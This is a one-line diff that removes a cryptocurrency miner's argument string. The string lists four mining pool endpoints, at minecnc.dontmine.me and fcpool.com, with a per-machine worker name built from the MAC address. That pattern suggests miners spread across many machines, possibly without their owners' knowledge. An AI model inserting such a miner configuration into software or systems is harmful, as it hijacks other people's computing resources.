@@ -1,1 +1,0 @@
--o stratum+tcp://minecnc.dontmine.me:33334  -u offlinehacker.$MAC -p x -o http://minecnc.dontmine.me:38339 -u offlinehacker.$MAC -p x -o stratum+tcp://fcpool.com:3333 -u offlinehacker.$MAC -p x -o http://fcpool.com:8377 -u offlinehacker.$MAC -p x
